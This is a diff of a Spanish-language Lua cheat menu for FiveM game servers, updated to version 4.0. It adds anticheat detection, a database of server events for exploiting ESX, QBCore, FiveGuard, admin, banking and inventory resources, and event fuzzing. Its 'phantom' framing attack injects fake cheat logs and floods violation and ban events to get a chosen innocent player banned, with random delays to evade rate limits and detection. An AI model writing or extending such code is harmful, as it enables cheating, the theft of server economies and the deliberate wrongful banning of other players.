@@ -1,7 +1,7 @@
 --[[
-    SENTEX MENU v3.6 - Event Hunter + FiveGuard Framing
+    SENTEX MENU v4.0 - FiveGuard Overload
+    Ataque de Framing Avanzado + Exploits por Recursos
     Abre con PAGEDOWN
-    Incluye todas las opciones originales + fuzzing de eventos + ataque a FiveGuard
 ]]
 
 local _r = math.random
@@ -12,17 +12,21 @@ local _notify = function(msg)
     DrawNotification(false, false)
 end
 
-local _version = "v3.6 Beta + EH"
+local _version = "v4.0 - Overload"
 local _discord = ".gg/sentexmodz"
 
--- ========== DETECCIÓN DE ANTICHEAT ==========
+-- ============================================================================
+-- 1. DETECCIÓN DE ANTICHEAT
+-- ============================================================================
 local _acDetected = false
 local _acList = {}
 local _acDB = {
-    {"WaveShield", {"waveshield", "ws_core"}},
     {"FiveGuard", {"fiveguard", "fg_anticheat", "fg-anticheat"}},
-    {"ElectronAC", {"electronac"}},
-    {"Eulen", {"eulen"}},
+    {"Eulen", {"eulen", "eulencheat"}},
+    {"RedEngine", {"redengine"}},
+    {"WaveShield", {"waveshield"}},
+    {"SecureServe", {"secureserve", "ss_anticheat"}},
+    {"AntiCheese", {"anticheese", "ac_anticheat"}},
 }
 
 local function _scanAC()
@@ -55,7 +59,24 @@ local function _scanAC()
     end
 end
 
--- ========== ACCIONES ORIGINALES ==========
+-- ============================================================================
+-- 2. FUNCIONES AUXILIARES (Sigilo)
+-- ============================================================================
+local function _gen_random_string(len)
+    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    local res = ""
+    for _ = 1, len do res = res .. chars:sub(_r(1, #chars), _r(1, #chars)) end
+    return res
+end
+
+local function _randomized_trigger(event_prefix, ...)
+    local rnd_name = event_prefix .. "_" .. _gen_random_string(6)
+    pcall(function() TriggerServerEvent(rnd_name, ...) end)
+end
+
+-- ============================================================================
+-- 3. ACCIONES ORIGINALES (Self, Vehicle, Map, Protection)
+-- ============================================================================
 local function _curar()
     local p = PlayerPedId()
     SetEntityHealth(p, GetEntityMaxHealth(p))
@@ -337,7 +358,9 @@ end
 -- Seguir
 local _siguienteJugador = nil
 
--- ========== EVENT HUNTER ==========
+-- ============================================================================
+-- 4. EVENT HUNTER BÁSICO (FUZZING)
+-- ============================================================================
 local _fuzzingActive = false
 local _foundEvents = {}
 
@@ -347,8 +370,7 @@ local _eventsToFuzz = {
     "giveMoney", "addMoney", "setMoney", "giveItem", "addItem", "esx:giveMoney", "qb:giveMoney",
     "revive", "heal", "respawn", "esx:revive", "hospital:revive",
     "tp", "teleport", "goto", "esx:teleport",
-    "spawnVehicle", "givecar", "vehicle:spawn",
-    "adminCommand", "staffCommand", "modCommand", "exec", "run"
+    "spawnVehicle", "givecar", "vehicle:spawn", "adminCommand", "staffCommand"
 }
 
 local function _generateVariations(base)
@@ -374,9 +396,7 @@ local function _startFuzzing()
         local vars = _generateVariations(base)
         for _, ev in ipairs(vars) do
             total = total + 1
-            local success, err = pcall(function()
-                TriggerServerEvent(ev, "test_".._r(1,9999))
-            end)
+            local success, err = pcall(function() TriggerServerEvent(ev, "test_".._r(1,9999)) end)
             if not err and not _foundEvents[ev] then
                 _foundEvents[ev] = true
                 _notify("~g~[+] "..ev)
@@ -386,7 +406,8 @@ local function _startFuzzing()
         _notify("~b~Progreso: "..total)
     end
     _fuzzingActive = false
-    _notify("~g~Encontrados "..table.count(_foundEvents).." eventos")
+    local count = 0 for _,_ in pairs(_foundEvents) do count = count+1 end
+    _notify("~g~Encontrados "..count.." eventos")
     _refrescarListaEventos()
 end
 
@@ -406,37 +427,110 @@ local function _refrescarListaEventos()
     _menus["event_list"] = opts
 end
 
--- ========== ATAQUE DE FRAMING (FIVEGUARD) ==========
-local function _framingAttack(pid)
-    local targetId = GetPlayerServerId(pid)
-    local name = _nombreJugador(pid)
-    if not targetId then _notify("~r~Error ID") return end
+-- ============================================================================
+-- 5. BASE DE DATOS DE EXPLOITS POR RECURSOS POPULARES
+-- ============================================================================
+local _exploit_database = {
+    -- Frameworks
+    ESX = {"esx:ban", "esx:kick", "esx:giveMoney", "esx:addInventoryItem", "esx:removeInventoryItem", "esx:setJob", "esx:spawnVehicle", "esx:teleport"},
+    QBCore = {"qb-ban:player", "qb:kick", "qb:giveMoney", "qb:addItem", "qb:removeItem", "qb:setJob", "qb:spawnVehicle", "qb:teleport"},
+    -- Anticheats
+    FiveGuard = {"FiveGuard:AddViolation", "FiveGuard:Ban", "FiveGuard:Detection", "fg_ban", "anticheat:report", "anticheat:blacklisted_weapon", "anticheat:teleport_hack", "anticheat:godmode", "anticheat:noclip"},
+    SecureServe = {"SecureServe:Ban", "SecureServe:Flag", "ss:ban", "ss:kick"},
+    AntiCheese = {"AntiCheese:Ban", "ac:detect", "ac:ban"},
+    -- Administración
+    EasyAdmin = {"ea:ban", "ea:kick", "ea:teleport", "ea:giveMoney", "ea:giveItem", "ea:spawnVehicle"},
+    AdminMenu = {"admin:ban", "admin:kick", "admin:tp", "admin:heal", "admin:revive"},
+    -- Economía
+    qb_banking = {"qb-banking:transfer", "qb-banking:addMoney", "qb-banking:withdraw"},
+    esx_society = {"esx_society:withdrawMoney", "esx_society:depositMoney", "esx_society:setMoney"},
+    esx_banksecurity = {"esx_banksecurity:transfer", "esx_banksecurity:addMoney"},
+    -- Utilidades
+    qb_phone = {"qb-phone:adminCall", "qb-phone:sendAdminMessage", "qb-phone:givePhone"},
+    ox_lib = {"ox_lib:adminCommand", "ox_lib:execute", "ox_lib:notify"},
+    discord_bot = {"discord:adminCommand", "discord:banUser", "discord:kickUser"},
+    -- Inventarios
+    ox_inventory = {"ox_inventory:giveItem", "ox_inventory:removeItem", "ox_inventory:setItem", "ox_inventory:openAdminInv"},
+    qb_inventory = {"qb-inventory:giveItem", "qb-inventory:removeItem", "qb-inventory:setSlot", "qb-inventory:openInventory"},
+}
 
-    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "Razón falsa:", "", "", "", 50)
-    while UpdateOnscreenKeyboard()==0 do _w(0) end
-    local reason = GetOnscreenKeyboardResult()
-    if reason=="" then reason="Cheating detected" end
-
-    _notify("~y~[Framing] Atacando a "..name.." (ID:"..targetId..")")
-
-    -- Violaciones masivas
-    local viol = {"FiveGuard:AddViolation","FiveGuard:Detection","anticheat:report","anticheat:godmode","anticheat:teleport_hack"}
-    local bans = {"admin:ban","staff:ban","esx:ban","qb-ban:player","FiveGuard:Ban"}
-
-    for i=1,150 do
-        for _,v in ipairs(viol) do
-            pcall(function() TriggerServerEvent(v, targetId, "EXPLOIT", 100) end)
-            pcall(function() TriggerServerEvent(v, targetId, "speedhack", 100) end)
-        end
-        for _,b in ipairs(bans) do
-            pcall(function() TriggerServerEvent(b, targetId, reason) end)
-        end
-        _w(10)
+-- Recopilar todos los eventos de la base de datos en una sola lista
+local _all_exploit_events = {}
+for _, events in pairs(_exploit_database) do
+    for _, ev in ipairs(events) do
+        table.insert(_all_exploit_events, ev)
     end
-    _notify("~r~Ataque completado. Si FiveGuard es vulnerable, el jugador será baneado.")
 end
 
--- ========== ACCIONES DE JUGADOR (con ban y framing) ==========
+-- ============================================================================
+-- 6. ATAQUE DE FRAMING AVANZADO (MODO FANTASMA)
+-- ============================================================================
+local function _advanced_framing_attack(victim_pid)
+    local target_id = GetPlayerServerId(victim_pid)
+    if not target_id then _notify("~r~Error ID") return end
+    local target_name = GetPlayerName(victim_pid)
+
+    _notify("~y~[SENTEX] Modo Fantasma contra: " .. target_name)
+
+    -- --------------------------------------------------------
+    -- Fase 1: Barrido de logs (inyección de falsos positivos)
+    -- --------------------------------------------------------
+    local log_events = {
+        "qb-log:server:CreateLog", "esx_logs:addLog", "discord:sendLog", "log:addEntry",
+        "admin:print", "anticheat:addViolation", "ox_lib:notify", "chat:addMessage",
+        "player:receiveMessage", "AntiCheat:SendLog", "FiveGuard:SendLog", "log:received",
+        "bank:transfer:log", "ox_inventory:log", "inventory:server:Log", "qb-phone:server:LogCall"
+    }
+    for _, ev in ipairs(log_events) do
+        for _ = 1, 3 do
+            pcall(function()
+                TriggerServerEvent(ev, "Suspicious activity detected from " .. target_name, "HIGH", "CHEAT")
+            end)
+            _w(_r(50, 150))
+        end
+    end
+
+    -- --------------------------------------------------------
+    -- Fase 2: Inundación sigilosa con eventos de exploits
+    -- --------------------------------------------------------
+    for i = 1, 200 do
+        local ev = _all_exploit_events[_r(#_all_exploit_events)]
+        if ev then
+            -- Llamada con diferentes tipos de parámetros para maximizar impacto
+            pcall(function()
+                TriggerServerEvent(ev, target_id, _r(1, 999999), "HACK_" .. _r(1000, 9999))
+                _w(_r(5, 25))
+                TriggerServerEvent(ev, target_id, "Money", _r(10000, 1000000))
+                _w(_r(5, 25))
+                TriggerServerEvent(ev, target_id, "ITEM_" .. _gen_random_string(5), _r(1, 500))
+                _w(_r(5, 25))
+                TriggerServerEvent(ev, target_id, "EXPLOIT_" .. _gen_random_string(4), true)
+            end)
+        end
+        -- Pausa variable para simular comportamiento humano y evitar rate-limiting
+        _w(_r(10, 60))
+    end
+
+    -- --------------------------------------------------------
+    -- Fase 3: Ataque directo (comandos de admin comunes)
+    -- --------------------------------------------------------
+    local admin_commands = {"ban", "kick", "tp", "giveMoney", "giveItem", "revive", "heal", "setJob"}
+    for _, cmd in ipairs(admin_commands) do
+        pcall(function()
+            TriggerServerEvent("admin:"..cmd, target_id)
+            TriggerServerEvent("staff:"..cmd, target_id)
+            TriggerServerEvent("esx:"..cmd, target_id)
+            TriggerServerEvent("qb:"..cmd, target_id)
+        end)
+        _w(50)
+    end
+
+    _notify("~r~[SENTEX] Ataque Fantasma finalizado. Revisa si el objetivo fue baneado.")
+end
+
+-- ============================================================================
+-- 7. ACCIONES DE JUGADOR (BAN SIMPLE + FRAMING)
+-- ============================================================================
 local function _crearAccion(pid, tipo)
     return function()
         if tipo=="inventory" then _abrirInventario(pid)
@@ -461,12 +555,14 @@ local function _crearAccion(pid, tipo)
                 TriggerServerEvent('staff:banPlayer', sid, "test")
                 _notify("~y~Intento de baneo directo")
             end
-        elseif tipo=="framing" then _framingAttack(pid)
+        elseif tipo=="framing" then _advanced_framing_attack(pid)
         end
     end
 end
 
--- ========== MAP FUCKER ==========
+-- ============================================================================
+-- 8. MAP FUCKER (Todas las opciones originales)
+-- ============================================================================
 local _vehiclesAttached = {}
 local function _attachAllNearbyVehicles()
     local myVeh = GetVehiclePedIsIn(PlayerPedId(), false)
@@ -661,7 +757,9 @@ Citizen.CreateThread(function()
     end
 end)
 
--- ========== NOCLIP ==========
+-- ============================================================================
+-- 9. NOCLIP Y FREECAM (originales)
+-- ============================================================================
 local _noclipActivo = false
 local _noclipVel = 5.0
 local _boostMult = 3.0
@@ -718,7 +816,6 @@ Citizen.CreateThread(function()
     end
 end)
 
--- ========== FREECAM ==========
 local freecamActive = false
 local freecamCam = nil
 local freecamStartPos = nil
@@ -791,7 +888,9 @@ Citizen.CreateThread(function()
     end
 end)
 
--- ========== MENÚ PRINCIPAL ==========
+-- ============================================================================
+-- 10. MENÚ PRINCIPAL
+-- ============================================================================
 local _menuVisible = false
 local _menuActual = "main"
 local _optActual = 1
@@ -813,7 +912,7 @@ local function _randomizarEstilos()
     _glowColor = {v(0),v(180),v(255),80}
     _selectBg = {v(30),v(144),v(255),60}
     _posX = 0.7 + (_r(-2,2)/100)
-    local banners = {"SENTEX MENU","SENTEX","SX MENU","SENTEX v3.6"}
+    local banners = {"SENTEX MENU","SENTEX","SX MENU","SENTEX v4.0"}
     _bannerTexto = banners[_r(#banners)]
 end
 
@@ -861,7 +960,7 @@ _menus["protection"] = {
 _menus["event_hunter"] = {
     {nombre="• Iniciar Event Hunter", accion=_startFuzzing, desc="Prueba eventos (1-2 min)"},
     {nombre="• Ver eventos encontrados", submenu="event_list", desc="Lista de eventos"},
-    {nombre="• Ataque Framing (FiveGuard)", accion=function() _menuActual="player_list"; _optActual=1; _notify("~y~Selecciona un jugador") end, desc="Abre Player List para elegir objetivo"},
+    {nombre="• Ataque Fantasma (FiveGuard)", accion=function() _menuActual="player_list"; _optActual=1; _notify("~y~Selecciona un jugador") end, desc="Abre Player List para elegir objetivo"},
 }
 
 -- Dinámicos
@@ -900,7 +999,7 @@ local function _refrescarListaJugadores()
                 {nombre="• Spawn NPCs", accion=_crearAccion(pid,"spawnnpc")},
                 {nombre="• Enganchar vehículo", accion=_crearAccion(pid,"attachveh")},
                 {nombre="• Banear (simple)", accion=_crearAccion(pid,"ban")},
-                {nombre="• Framing (FiveGuard)", accion=_crearAccion(pid,"framing")},
+                {nombre="• Ataque Fantasma (FiveGuard)", accion=_crearAccion(pid,"framing")},
             }
         end
     end
@@ -1044,7 +1143,9 @@ function _drawMenu()
     _drawACAlert()
 end
 
--- Inicialización
+-- ============================================================================
+-- 11. INICIALIZACIÓN
+-- ============================================================================
 local _menuListo = false
 local _retardo = 5000 + _r(0,10000)
 
